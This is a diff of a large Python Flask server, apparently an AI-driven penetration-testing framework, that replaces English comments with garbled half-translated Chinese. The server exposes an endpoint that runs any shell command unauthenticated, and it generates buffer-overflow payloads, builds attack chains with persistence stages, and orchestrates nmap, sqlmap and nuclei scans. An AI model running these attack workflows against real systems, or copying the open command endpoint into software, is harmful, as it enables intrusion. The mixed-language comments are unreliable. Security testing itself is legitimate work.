     exploit = BufferOverflowExploit(target_host, target_port)
     
-    print(f"[+] Buffer Overflow Exploit for {cve_id}")
-    print(f"[+] Target: {{target_host}}:{{target_port}}")
-    print(f"[+] Architecture: {arch}")
+    print(f"[+] 缓冲区 溢出 利用 用于{cve_id}")
+    print(f"[+] 目标：{{target_host}}:{{target_port}}")
+    print(f"[+] 架构：{arch}")
     
-    # Create and send exploit
+    # Create and send 利用
     payload = exploit.create_exploit()
     exploit.send_exploit(payload)
 
@@ -8508,7 +8508,7 @@ if __name__ == "__main__":
 '''
 
     def _generate_usage_instructions(self, vuln_type, params):
-        """Generate usage instructions for the exploit"""
+        """生成 usage instructions 用于 the 利用"""
         instructions = [
             f"# Exploit for CVE {params['cve_id']}",
             f"# Vulnerability Type: {vuln_type}",
@@ -8536,7 +8536,7 @@ if __name__ == "__main__":
         return "\n".join(instructions)
 
 class VulnerabilityCorrelator:
-    """Correlate vulnerabilities for multi-stage attack chain discovery"""
+    """Correlate 漏洞 用于 multi-stage attack chain 发现"""
 
     def __init__(self):
         self.attack_patterns = {
@@ -8555,20 +8555,20 @@ class VulnerabilityCorrelator:
         }
 
     def find_attack_chains(self, target_software, max_depth=3):
-        """Find multi-vulnerability attack chains"""
+        """Find multi-漏洞 attack chains"""
         try:
-            # This is a simplified implementation
-            # Real version would use graph algorithms and ML
+            # 说明：This is a simplified implementation
+            # Real version would use graph algorithms 与 ML
 
             chains = []
 
-            # Example attack chain discovery logic
+            # 示例 attack chain 发现 logic
             base_software = target_software.lower()
 
-            # Find initial access vulnerabilities
+            # Find initial access 漏洞
             initial_vulns = self._find_vulnerabilities_by_pattern(base_software, "remote_execution")
 
-            for initial_vuln in initial_vulns[:3]:  # Limit for demo
+            for initial_vuln in initial_vulns[:3]:  # Limit 用于 demo
                 chain = {
                     "chain_id": f"chain_{len(chains) + 1}",
                     "target": target_software,
@@ -8584,7 +8584,7 @@ class VulnerabilityCorrelator:
                     "complexity": "MEDIUM"
                 }
 
-                # Find privilege escalation
+                # 说明：Find privilege escalation
                 priv_esc_vulns = self._find_vulnerabilities_by_pattern(base_software, "privilege_escalation")
                 if priv_esc_vulns:
                     chain["stages"].append({
@@ -8595,7 +8595,7 @@ class VulnerabilityCorrelator:
                     })
                     chain["overall_probability"] *= 0.60
 
-                # Find persistence
+                # 说明：Find persistence
                 persistence_vulns = self._find_vulnerabilities_by_pattern(base_software, "persistence")
                 if persistence_vulns and len(chain["stages"]) < max_depth:
                     chain["stages"].append({
@@ -8621,8 +8621,8 @@ class VulnerabilityCorrelator:
             return {"success": False, "error": str(e)}
 
     def _find_vulnerabilities_by_pattern(self, software, pattern_type):
-        """Find vulnerabilities matching attack pattern"""
-        # Simplified mock data - real implementation would query CVE database
+        """Find 漏洞 matching attack pattern"""
+        # 说明：Simplified mock data - real implementation would query CVE database
         mock_vulnerabilities = [
             {
                 "cve_id": "CVE-2024-1234",
@@ -8641,7 +8641,7 @@ class VulnerabilityCorrelator:
         return mock_vulnerabilities
 
     def _generate_chain_recommendations(self, chains):
-        """Generate recommendations for attack chains"""
+        """生成 recommendations 用于 attack chains"""
         if not chains:
             return "No viable attack chains found for target"
 
@@ -8656,34 +8656,34 @@ class VulnerabilityCorrelator:
 
         return "\n".join(recommendations)
 
-# Global intelligence managers
+# 全局 intelligence managers
 cve_intelligence = CVEIntelligenceManager()
 exploit_generator = AIExploitGenerator()
 vulnerability_correlator = VulnerabilityCorrelator()
 
 def execute_command(command: str, use_cache: bool = True) -> Dict[str, Any]:
     """
-    Execute a shell command with enhanced features
+    执行 a shell 命令 使用 增强 features
 
-    Args:
-        command: The command to execute
-        use_cache: Whether to use caching for this command
+    参数:
+        command: The 命令 到 执行
+        use_cache: Whether 到 use caching 用于 this 命令
 
-    Returns:
-        A dictionary containing the stdout, stderr, return code, and metadata
+    返回:
+        A dictionary containing the stdout, stderr, return code, 与 metadata
     """
 
-    # Check cache first
+    # 检查 缓存 第一
     if use_cache:
         cached_result = cache.get(command, {})
         if cached_result:
             return cached_result
 
-    # Execute command
+    # 执行 命令
     executor = EnhancedCommandExecutor(command)
     result = executor.execute()
 
-    # Cache successful results
+    # 缓存 successful 结果
     if use_cache and result.get("success", False):
         cache.set(command, {}, result)
 
@@ -8692,17 +8692,17 @@ def execute_command(command: str, use_cache: bool = True) -> Dict[str, Any]:
 def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict[str, Any] = None,
                                  use_cache: bool = True, max_attempts: int = 3) -> Dict[str, Any]:
     """
-    Execute a command with intelligent error handling and recovery
+    执行 a 命令 使用 智能 错误 handling 与 恢复
 
-    Args:
-        tool_name: Name of the tool being executed
-        command: The command to execute
-        parameters: Tool parameters for context
-        use_cache: Whether to use caching
-        max_attempts: Maximum number of recovery attempts
+    参数:
+        tool_name: Name 的 the 工具 being executed
+        command: The 命令 到 执行
+        parameters: 工具 参数 用于 context
+        use_cache: Whether 到 use caching
+        max_attempts: Maximum number 的 恢复 attempts
 
-    Returns:
-        A dictionary containing execution results with recovery information
+    返回:
+        A dictionary containing execution 结果 使用 恢复 information
     """
     if parameters is None:
         parameters = {}
@@ -8715,12 +8715,12 @@ def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict
         attempt_count += 1
 
         try:
-            # Execute the command
+            # 执行 the 命令
             result = execute_command(command, use_cache)
 
-            # Check if execution was successful
+            # 检查 如果 execution was successful
             if result.get("success", False):
-                # Add recovery information to successful result
+                # Add 恢复 information 到 successful 结果
                 result["recovery_info"] = {
                     "attempts_made": attempt_count,
                     "recovery_applied": len(recovery_history) > 0,
@@ -8728,11 +8728,11 @@ def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict
                 }
                 return result
 
-            # Command failed, determine if we should attempt recovery
+            # 命令 失败, 判断 如果 we should attempt 恢复
             error_message = result.get("stderr", "Unknown error")
             exception = Exception(error_message)
 
-            # Create context for error handler
+            # 创建 context 用于 错误 handler
             context = {
                 "target": parameters.get("target", "unknown"),
                 "parameters": parameters,
@@ -8740,7 +8740,7 @@ def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict
                 "command": command
             }
 
-            # Get recovery strategy from error handler
+            # 获取 恢复 策略 来自 错误 handler
             recovery_strategy = error_handler.handle_tool_failure(tool_name, exception, context)
             recovery_history.append({
                 "attempt": attempt_count,
@@ -8749,7 +8749,7 @@ def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict
                 "timestamp": datetime.now().isoformat()
             })
 
-            # Apply recovery strategy
+            # Apply 恢复 策略
             if recovery_strategy.action == RecoveryAction.RETRY_WITH_BACKOFF:
                 delay = recovery_strategy.parameters.get("initial_delay", 5)
                 backoff = recovery_strategy.parameters.get("max_delay", 60)
@@ -8761,26 +8761,26 @@ def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict
                 continue
 
             elif recovery_strategy.action == RecoveryAction.RETRY_WITH_REDUCED_SCOPE:
-                # Adjust parameters to reduce scope
+                # Adjust 参数 到 reduce scope
                 adjusted_params = error_handler.auto_adjust_parameters(
                     tool_name,
                     error_handler.classify_error(error_message, exception),
                     parameters
                 )
 
-                # Rebuild command with adjusted parameters
+                # Rebuild 命令 使用 adjusted 参数
                 command = _rebuild_command_with_params(tool_name, command, adjusted_params)
                 logger.info(f" Retrying {tool_name} with reduced scope")
                 continue
 
             elif recovery_strategy.action == RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL:
-                # Get alternative tool
+                # 获取 alternative 工具
                 alternative_tool = error_handler.get_alternative_tool(tool_name, recovery_strategy.parameters)
 
                 if alternative_tool:
                     switch_info = f'Switching to alternative: {alternative_tool}'
                     logger.info(f"{ModernVisualEngine.format_tool_status(tool_name, 'RECOVERY', switch_info)}")
-                    # This would require the calling function to handle tool switching
+                    # This would require the calling function 到 处理 工具 switching
                     result["alternative_tool_suggested"] = alternative_tool
                     result["recovery_info"] = {
                         "attempts_made": attempt_count,
@@ -8793,17 +8793,17 @@ def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict
                     logger.warning(f"  No alternative tool found for {tool_name}")
 
             elif recovery_strategy.action == RecoveryAction.ADJUST_PARAMETERS:
-                # Adjust parameters based on error type
+                # Adjust 参数 based 在 错误 类型
                 error_type = error_handler.classify_error(error_message, exception)
                 adjusted_params = error_handler.auto_adjust_parameters(tool_name, error_type, parameters)
 
-                # Rebuild command with adjusted parameters
+                # Rebuild 命令 使用 adjusted 参数
                 command = _rebuild_command_with_params(tool_name, command, adjusted_params)
                 logger.info(f" Retrying {tool_name} with adjusted parameters")
                 continue
 
             elif recovery_strategy.action == RecoveryAction.ESCALATE_TO_HUMAN:
-                # Create error context for escalation
+                # 创建 错误 context 用于 escalation
                 error_context = ErrorContext(
                     tool_name=tool_name,
                     target=parameters.get("target", "unknown"),
@@ -8831,7 +8831,7 @@ def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict
                 return result
 
             elif recovery_strategy.action == RecoveryAction.GRACEFUL_DEGRADATION:
-                # Apply graceful degradation
+                # 说明：Apply graceful degradation
                 operation = _determine_operation_type(tool_name)
                 degraded_result = degradation_manager.handle_partial_failure(
                     operation,
@@ -8863,7 +8863,7 @@ def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict
             last_error = e
             logger.error(f" Unexpected error in recovery attempt {attempt_count}: {str(e)}")
 
-            # If this is the last attempt, escalate to human
+            # 如果 this is the 最后 attempt, escalate 到 human
             if attempt_count >= max_attempts:
                 error_context = ErrorContext(
                     tool_name=tool_name,
@@ -8891,7 +8891,7 @@ def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict
                     }
                 }
 
-    # All attempts exhausted
+    # 全部 attempts exhausted
     logger.error(f" All recovery attempts exhausted for {tool_name}")
     return {
         "success": False,
@@ -8905,9 +8905,9 @@ def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict
     }
 
 def _rebuild_command_with_params(tool_name: str, original_command: str, new_params: Dict[str, Any]) -> str:
-    """Rebuild command with new parameters"""
-    # This is a simplified implementation - in practice, you'd need tool-specific logic
-    # For now, we'll just append new parameters
+    """Rebuild 命令 使用 new 参数"""
+    # This is a simplified implementation - 在 practice, you'd need tool-specific logic
+    # 用于 now, we'll just append new 参数
     additional_args = []
 
     for key, value in new_params.items():
@@ -8930,7 +8930,7 @@ def _rebuild_command_with_params(tool_name: str, original_command: str, new_para
     return original_command
 
 def _determine_operation_type(tool_name: str) -> str:
-    """Determine operation type based on tool name"""
+    """判断 操作 类型 based 在 工具 name"""
     operation_mapping = {
         "nmap": "network_discovery",
         "rustscan": "network_discovery",
@@ -8952,17 +8952,17 @@ def _determine_operation_type(tool_name: str) -> str:
 
     return operation_mapping.get(tool_name, "unknown_operation")
 
-# File Operations Manager
+# 文件 操作 Manager
 class FileOperationsManager:
-    """Handle file operations with security and validation"""
+    """处理 文件 操作 使用 安全 与 validation"""
 
     def __init__(self, base_dir: str = "/tmp/hexstrike_files"):
         self.base_dir = Path(base_dir)
         self.base_dir.mkdir(exist_ok=True)
-        self.max_file_size = 100 * 1024 * 1024  # 100MB
+        self.max_file_size = 100 * 1024 * 1024  # 说明：100MB
 
     def create_file(self, filename: str, content: str, binary: bool = False) -> Dict[str, Any]:
-        """Create a file with the specified content"""
+        """创建 a 文件 使用 the specified content"""
         try:
             file_path = self.base_dir / filename
             file_path.parent.mkdir(parents=True, exist_ok=True)
@@ -8985,7 +8985,7 @@ class FileOperationsManager:
             return {"success": False, "error": str(e)}
 
     def modify_file(self, filename: str, content: str, append: bool = False) -> Dict[str, Any]:
-        """Modify an existing file"""
+        """Modify an existing 文件"""
         try:
             file_path = self.base_dir / filename
             if not file_path.exists():
@@ -9003,7 +9003,7 @@ class FileOperationsManager:
             return {"success": False, "error": str(e)}
 
     def delete_file(self, filename: str) -> Dict[str, Any]:
-        """Delete a file or directory"""
+        """删除 a 文件 或 目录"""
         try:
             file_path = self.base_dir / filename
             if not file_path.exists():
@@ -9022,7 +9022,7 @@ class FileOperationsManager:
             return {"success": False, "error": str(e)}
 
     def list_files(self, directory: str = ".") -> Dict[str, Any]:
-        """List files in a directory"""
+        """列出 文件 在 a 目录"""
         try:
             dir_path = self.base_dir / directory
             if not dir_path.exists():
@@ -9043,14 +9043,14 @@ class FileOperationsManager:
             logger.error(f" Error listing files in {directory}: {e}")
             return {"success": False, "error": str(e)}
 
-# Global file operations manager
+# 全局 文件 操作 manager
 file_manager = FileOperationsManager()
 
-# API Routes
+# 说明：API Routes
 
 @app.route("/health", methods=["GET"])
 def health_check():
-    """Health check endpoint with comprehensive tool detection"""
+    """健康 检查 端点 使用 综合 工具 detection"""
 
     essential_tools = [
         "nmap", "gobuster", "dirb", "nikto", "sqlmap", "hydra", "john", "hashcat"
@@ -9164,7 +9164,7 @@ def health_check():
 
 @app.route("/api/command", methods=["POST"])
 def generic_command():
-    """Execute any command provided in the request with enhanced logging"""
+    """执行 any 命令 provided 在 the 请求 使用 增强日志"""
     try:
         params = request.json
         command = params.get("command", "")
@@ -9185,11 +9185,11 @@ def generic_command():
             "error": f"Server error: {str(e)}"
         }), 500
 
-# File Operations API Endpoints
+# 文件 操作 API 端点
 
 @app.route("/api/files/create", methods=["POST"])
 def create_file():
-    """Create a new file"""
+    """创建 a new 文件"""
     try:
         params = request.json
         filename = params.get("filename", "")
@@ -9207,7 +9207,7 @@ def create_file():
 
 @app.route("/api/files/modify", methods=["POST"])
 def modify_file():
-    """Modify an existing file"""
+    """Modify an existing 文件"""
     try:
         params = request.json
         filename = params.get("filename", "")
@@ -9225,7 +9225,7 @@ def modify_file():
 
 @app.route("/api/files/delete", methods=["DELETE"])
 def delete_file():
-    """Delete a file or directory"""
+    """删除 a 文件 或 目录"""
     try:
         params = request.json
         filename = params.get("filename", "")
@@ -9241,7 +9241,7 @@ def delete_file():
 
 @app.route("/api/files/list", methods=["GET"])
 def list_files():
-    """List files in a directory"""
+    """列出 文件 在 a 目录"""
     try:
         directory = request.args.get("directory", ".")
         result = file_manager.list_files(directory)
@@ -9250,10 +9250,10 @@ def list_files():
         logger.error(f" Error listing files: {str(e)}")
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
-# Payload Generation Endpoint
+# 载荷 Generation 端点
 @app.route("/api/payloads/generate", methods=["POST"])
 def generate_payload():
-    """Generate large payloads for testing"""
+    """生成 large payloads 用于 测试"""
     try:
         params = request.json
         payload_type = params.get("type", "buffer")
@@ -9261,13 +9261,13 @@ def generate_payload():
         pattern = params.get("pattern", "A")
         filename = params.get("filename", f"payload_{int(time.time())}")
 
-        if size > 100 * 1024 * 1024:  # 100MB limit
+        if size > 100 * 1024 * 1024:  # 说明：100MB limit
             return jsonify({"error": "Payload size too large (max 100MB)"}), 400
 
         if payload_type == "buffer":
             content = pattern * (size // len(pattern))
         elif payload_type == "cyclic":
-            # Generate cyclic pattern
+            # 生成 cyclic pattern
             alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             content = ""
             for i in range(size):
@@ -9292,37 +9292,37 @@ def generate_payload():
         logger.error(f" Error generating payload: {str(e)}")
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
-# Cache Management Endpoint
+# 缓存 Management 端点
 @app.route("/api/cache/stats", methods=["GET"])
 def cache_stats():
-    """Get cache statistics"""
+    """获取 缓存 统计"""
     return jsonify(cache.get_stats())
 
 @app.route("/api/cache/clear", methods=["POST"])
 def clear_cache():
-    """Clear the cache"""
+    """Clear the 缓存"""
     cache.cache.clear()
     cache.stats = {"hits": 0, "misses": 0, "evictions": 0}
     logger.info(" Cache cleared")
     return jsonify({"success": True, "message": "Cache cleared"})
 
-# Telemetry Endpoint
+# Telemetry 端点
 @app.route("/api/telemetry", methods=["GET"])
 def get_telemetry():
-    """Get system telemetry"""
+    """获取 系统 telemetry"""
     return jsonify(telemetry.get_stats())
 
 # ============================================================================
-# PROCESS MANAGEMENT API ENDPOINTS (v5.0 ENHANCEMENT)
+# 进程 MANAGEMENT API 端点 (v5.0 ENHANCEMENT)
 # ============================================================================
 
 @app.route("/api/processes/list", methods=["GET"])
 def list_processes():
-    """List all active processes"""
+    """列出 全部 active processes"""
     try:
         processes = ProcessManager.list_active_processes()
 
-        # Add calculated fields for each process
+        # Add calculated fields 用于 each 进程
         for pid, info in processes.items():
             runtime = time.time() - info["start_time"]
             info["runtime_formatted"] = f"{runtime:.1f}s"
@@ -9344,12 +9344,12 @@ def list_processes():
 
 @app.route("/api/processes/status/<int:pid>", methods=["GET"])
 def get_process_status(pid):
-    """Get status of a specific process"""
+    """获取 状态 的 a specific 进程"""
     try:
         process_info = ProcessManager.get_process_status(pid)
 
         if process_info:
-            # Add calculated fields
+            # 说明：Add calculated fields
             runtime = time.time() - process_info["start_time"]
             process_info["runtime_formatted"] = f"{runtime:.1f}s"
 
@@ -9375,7 +9375,7 @@ def get_process_status(pid):
 
 @app.route("/api/processes/terminate/<int:pid>", methods=["POST"])
 def terminate_process(pid):
-    """Terminate a specific process"""
+    """Terminate a specific 进程"""
     try:
         success = ProcessManager.terminate_process(pid)
 
@@ -9397,7 +9397,7 @@ def terminate_process(pid):
 
 @app.route("/api/processes/pause/<int:pid>", methods=["POST"])
 def pause_process(pid):
-    """Pause a specific process"""
+    """Pause a specific 进程"""
     try:
         success = ProcessManager.pause_process(pid)
 
@@ -9419,7 +9419,7 @@ def pause_process(pid):
 
 @app.route("/api/processes/resume/<int:pid>", methods=["POST"])
 def resume_process(pid):
-    """Resume a paused process"""
+    """Resume a paused 进程"""
     try:
         success = ProcessManager.resume_process(pid)
 
@@ -9441,12 +9441,12 @@ def resume_process(pid):
 
 @app.route("/api/processes/dashboard", methods=["GET"])
 def process_dashboard():
-    """Get enhanced process dashboard with visual status using ModernVisualEngine"""
+    """获取 增强 进程 dashboard 使用 visual 状态 using ModernVisualEngine"""
     try:
         processes = ProcessManager.list_active_processes()
         current_time = time.time()
 
-        # Create beautiful dashboard using ModernVisualEngine
+        # 创建 beautiful dashboard using ModernVisualEngine
         dashboard_visual = ModernVisualEngine.create_live_dashboard(processes)
 
         dashboard = {
@@ -9465,7 +9465,7 @@ def process_dashboard():
             runtime = current_time - info["start_time"]
             progress_fraction = info.get("progress", 0)
 
-            # Create beautiful progress bar using ModernVisualEngine
+            # 创建 beautiful progress bar using ModernVisualEngine
             progress_bar = ModernVisualEngine.render_progress_bar(
                 progress_fraction,
                 width=25,
@@ -9494,13 +9494,13 @@ def process_dashboard():
 
 @app.route("/api/visual/vulnerability-card", methods=["POST"])
 def create_vulnerability_card():
-    """Create a beautiful vulnerability card using ModernVisualEngine"""
+    """创建 a beautiful 漏洞 card using ModernVisualEngine"""
     try:
         data = request.get_json()
         if not data:
             return jsonify({"error": "No data provided"}), 400
 
-        # Create vulnerability card
+        # 创建 漏洞 card
         card = ModernVisualEngine.render_vulnerability_card(data)
 
         return jsonify({
@@ -9515,13 +9515,13 @@ def create_vulnerability_card():
 
 @app.route("/api/visual/summary-report", methods=["POST"])
 def create_summary_report():
-    """Create a beautiful summary report using ModernVisualEngine"""
+    """创建 a beautiful summary report using ModernVisualEngine"""
     try:
         data = request.get_json()
         if not data:
             return jsonify({"error": "No data provided"}), 400
 
-        # Create summary report
+        # 创建 summary report
         visual_engine = ModernVisualEngine()
         report = visual_engine.create_summary_report(data)
 
@@ -9537,7 +9537,7 @@ def create_summary_report():
 
 @app.route("/api/visual/tool-output", methods=["POST"])
 def format_tool_output():
-    """Format tool output using ModernVisualEngine"""
+    """Format 工具 输出 using ModernVisualEngine"""
     try:
         data = request.get_json()
         if not data or 'tool' not in data or 'output' not in data:
@@ -9547,7 +9547,7 @@ def format_tool_output():
         output = data['output']
         success = data.get('success', True)
 
-        # Format tool output
+        # Format 工具 输出
         formatted_output = ModernVisualEngine.format_tool_output(tool, output, success)
 
         return jsonify({
@@ -9561,12 +9561,12 @@ def format_tool_output():
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 # ============================================================================
-# INTELLIGENT DECISION ENGINE API ENDPOINTS
+# 智能 DECISION ENGINE API 端点
 # ============================================================================
 
 @app.route("/api/intelligence/analyze-target", methods=["POST"])
 def analyze_target():
-    """Analyze target and create comprehensive profile using Intelligent Decision Engine"""
+    """分析 目标 与 创建 综合 profile using 智能 Decision Engine"""
     try:
         data = request.get_json()
         if not data or 'target' not in data:
@@ -9575,7 +9575,7 @@ def analyze_target():
         target = data['target']
         logger.info(f" Analyzing target: {target}")
 
-        # Use the decision engine to analyze the target
+        # Use the decision engine 到 分析 the 目标
         profile = decision_engine.analyze_target(target)
 
         logger.info(f" Target analysis completed for {target}")
@@ -9593,21 +9593,21 @@ def analyze_target():
 
 @app.route("/api/intelligence/select-tools", methods=["POST"])
 def select_optimal_tools():
-    """Select optimal tools based on target profile and objective"""
+    """选择 optimal 工具 based 在 目标 profile 与 objective"""
     try:
         data = request.get_json()
         if not data or 'target' not in data:
             return jsonify({"error": "Target is required"}), 400
 
         target = data['target']
-        objective = data.get('objective', 'comprehensive')  # comprehensive, quick, stealth
+        objective = data.get('objective', 'comprehensive')  # 综合, quick, stealth
 
         logger.info(f" Selecting optimal tools for {target} with objective: {objective}")
 
-        # Analyze target first
+        # 分析 目标 第一
         profile = decision_engine.analyze_target(target)
 
-        # Select optimal tools
+        # 选择 optimal 工具
         selected_tools = decision_engine.select_optimal_tools(profile, objective)
 
         logger.info(f" Selected {len(selected_tools)} tools for {target}")
@@ -9628,7 +9628,7 @@ def select_optimal_tools():
 
 @app.route("/api/intelligence/optimize-parameters", methods=["POST"])
 def optimize_tool_parameters():
-    """Optimize tool parameters based on target profile and context"""
+    """Optimize 工具 参数 based 在 目标 profile 与 context"""
     try:
         data = request.get_json()
         if not data or 'target' not in data or 'tool' not in data:
@@ -9640,10 +9640,10 @@ def optimize_tool_parameters():
 
         logger.info(f"  Optimizing parameters for {tool} against {target}")
 
-        # Analyze target first
+        # 分析 目标 第一
         profile = decision_engine.analyze_target(target)
 
-        # Optimize parameters
+        # Optimize 参数
         optimized_params = decision_engine.optimize_parameters(tool, profile, context)
 
         logger.info(f" Parameters optimized for {tool}")
@@ -9664,7 +9664,7 @@ def optimize_tool_parameters():
 
 @app.route("/api/intelligence/create-attack-chain", methods=["POST"])
 def create_attack_chain():
-    """Create an intelligent attack chain based on target profile"""
+    """创建 an 智能 attack chain based 在 目标 profile"""
     try:
         data = request.get_json()
         if not data or 'target' not in data:
@@ -9675,10 +9675,10 @@ def create_attack_chain():
 
         logger.info(f"  Creating attack chain for {target} with objective: {objective}")
 
-        # Analyze target first
+        # 分析 目标 第一
         profile = decision_engine.analyze_target(target)
 
-        # Create attack chain
+        # 创建 attack chain
         attack_chain = decision_engine.create_attack_chain(profile, objective)
 
         logger.info(f" Attack chain created with {len(attack_chain.steps)} steps")
@@ -9699,7 +9699,7 @@ def create_attack_chain():
 
 @app.route("/api/intelligence/smart-scan", methods=["POST"])
 def intelligent_smart_scan():
-    """Execute an intelligent scan using AI-driven tool selection and parameter optimization with parallel execution"""
+    """执行 an 智能 扫描 using AI-driven 工具 selection 与 参数 optimization 使用 parallel execution"""
     try:
         data = request.get_json()
         if not data or 'target' not in data:
@@ -9711,13 +9711,13 @@ def intelligent_smart_scan():
 
         logger.info(f" Starting intelligent smart scan for {target}")
 
-        # Analyze target
+        # 分析 目标
         profile = decision_engine.analyze_target(target)
 
-        # Select optimal tools
+        # 选择 optimal 工具
         selected_tools = decision_engine.select_optimal_tools(profile, objective)[:max_tools]
 
-        # Execute tools in parallel with real tool execution
+        # 执行 工具 在 parallel 使用 real 工具 execution
         scan_results = {
             "target": target,
             "target_profile": profile.to_dict(),
@@ -9728,14 +9728,14 @@ def intelligent_smart_scan():
         }
 
         def execute_single_tool(tool_name, target, profile):
-            """Execute a single tool and return results"""
+            """执行 a single 工具 与 return 结果"""
             try:
                 logger.info(f" Executing {tool_name} with optimized parameters")
 
-                # Get optimized parameters for this tool
+                # 获取 optimized 参数 用于 this 工具
                 optimized_params = decision_engine.optimize_parameters(tool_name, profile)
 
-                # Map tool names to their actual execution functions
+                # Map 工具 names 到 their actual execution functions
                 tool_execution_map = {
                     'nmap': lambda: execute_nmap_scan(target, optimized_params),
                     'gobuster': lambda: execute_gobuster_scan(target, optimized_params),
@@ -9755,14 +9755,14 @@ def intelligent_smart_scan():
                     'subfinder': lambda: execute_subfinder_scan(target, optimized_params)
                 }
 
-                # Execute the tool if we have a mapping for it
+                # 执行 the 工具 如果 we have a mapping 用于 it
                 if tool_name in tool_execution_map:
                     result = tool_execution_map[tool_name]()
 
-                    # Extract vulnerability count from result
+                    # Extract 漏洞 count 来自 结果
                     vuln_count = 0
                     if result.get('success') and result.get('stdout'):
-                        # Simple vulnerability detection based on common patterns
+                        # 简单 漏洞 detection based 在 常见 patterns
                         output = result.get('stdout', '')
                         vuln_indicators = ['CRITICAL', 'HIGH', 'MEDIUM', 'VULNERABILITY', 'EXPLOIT', 'SQL injection', 'XSS', 'CSRF']
                         vuln_count = sum(1 for indicator in vuln_indicators if indicator.lower() in output.lower())
@@ -9800,30 +9800,30 @@ def intelligent_smart_scan():
                     "success": False
                 }
 
-        # Execute tools in parallel using ThreadPoolExecutor
+        # 执行 工具 在 parallel using ThreadPoolExecutor
         with ThreadPoolExecutor(max_workers=min(len(selected_tools), 5)) as executor:
-            # Submit all tool executions
+            # Submit 全部 工具 executions
             future_to_tool = {
                 executor.submit(execute_single_tool, tool, target, profile): tool
                 for tool in selected_tools
             }
 
-            # Collect results as they complete
+            # 收集 结果 as they complete
             for future in future_to_tool:
                 tool_result = future.result()
                 scan_results["tools_executed"].append(tool_result)
 
-                # Accumulate vulnerability count
+                # Accumulate 漏洞 count
                 if tool_result.get("vulnerabilities_found"):
                     scan_results["total_vulnerabilities"] += tool_result["vulnerabilities_found"]
 
-                # Combine outputs
+                # 说明：Combine outputs
                 if tool_result.get("stdout"):
                     scan_results["combined_output"] += f"\n=== {tool_result['tool'].upper()} OUTPUT ===\n"
                     scan_results["combined_output"] += tool_result["stdout"]
                     scan_results["combined_output"] += "\n" + "="*50 + "\n"
 
-        # Create execution summary
+        # 创建 execution summary
         successful_tools = [t for t in scan_results["tools_executed"] if t.get("success")]
         failed_tools = [t for t in scan_results["tools_executed"] if not t.get("success")]
 
@@ -9849,15 +9849,15 @@ def intelligent_smart_scan():
         logger.error(f" Error in intelligent smart scan: {str(e)}")
         return jsonify({"error": f"Server error: {str(e)}", "success": False}), 500
 
-# Helper functions for intelligent smart scan tool execution
+# Helper functions 用于 智能 smart 扫描 工具 execution
 def execute_nmap_scan(target, params):
-    """Execute nmap scan with optimized parameters"""
+    """执行 nmap 扫描 使用 optimized 参数"""
     try:
         scan_type = params.get('scan_type', '-sV')
         ports = params.get('ports', '')
         additional_args = params.get('additional_args', '')
 
-        # Build nmap command
+        # Build nmap 命令
         cmd_parts = ['nmap', scan_type]
         if ports:
             cmd_parts.extend(['-p', ports])
@@ -9870,7 +9870,7 @@ def execute_nmap_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_gobuster_scan(target, params):
-    """Execute gobuster scan with optimized parameters"""
+    """执行 gobuster 扫描 使用 optimized 参数"""
     try:
         mode = params.get('mode', 'dir')
         wordlist = params.get('wordlist', '/usr/share/wordlists/dirb/common.txt')
@@ -9885,7 +9885,7 @@ def execute_gobuster_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_nuclei_scan(target, params):
-    """Execute nuclei scan with optimized parameters"""
+    """执行 nuclei 扫描 使用 optimized 参数"""
     try:
         severity = params.get('severity', '')
         tags = params.get('tags', '')
@@ -9904,7 +9904,7 @@ def execute_nuclei_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_nikto_scan(target, params):
-    """Execute nikto scan with optimized parameters"""
+    """执行 nikto 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '')
         cmd_parts = ['nikto', '-h', target]
@@ -9916,7 +9916,7 @@ def execute_nikto_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_sqlmap_scan(target, params):
-    """Execute sqlmap scan with optimized parameters"""
+    """执行 sqlmap 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '--batch --random-agent')
         cmd_parts = ['sqlmap', '-u', target]
@@ -9928,12 +9928,12 @@ def execute_sqlmap_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_ffuf_scan(target, params):
-    """Execute ffuf scan with optimized parameters"""
+    """执行 ffuf 扫描 使用 optimized 参数"""
     try:
         wordlist = params.get('wordlist', '/usr/share/wordlists/dirb/common.txt')
         additional_args = params.get('additional_args', '')
 
-        # Ensure target has FUZZ placeholder
+        # Ensure 目标 has FUZZ placeholder
         if 'FUZZ' not in target:
             target = target.rstrip('/') + '/FUZZ'
 
@@ -9946,7 +9946,7 @@ def execute_ffuf_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_feroxbuster_scan(target, params):
-    """Execute feroxbuster scan with optimized parameters"""
+    """执行 feroxbuster 扫描 使用 optimized 参数"""
     try:
         wordlist = params.get('wordlist', '/usr/share/wordlists/dirb/common.txt')
         additional_args = params.get('additional_args', '')
@@ -9960,7 +9960,7 @@ def execute_feroxbuster_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_katana_scan(target, params):
-    """Execute katana scan with optimized parameters"""
+    """执行 katana 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '')
         cmd_parts = ['katana', '-u', target]
@@ -9972,10 +9972,10 @@ def execute_katana_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_httpx_scan(target, params):
-    """Execute httpx scan with optimized parameters"""
+    """执行 httpx 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '-tech-detect -status-code')
-        # Use shell command with pipe for httpx
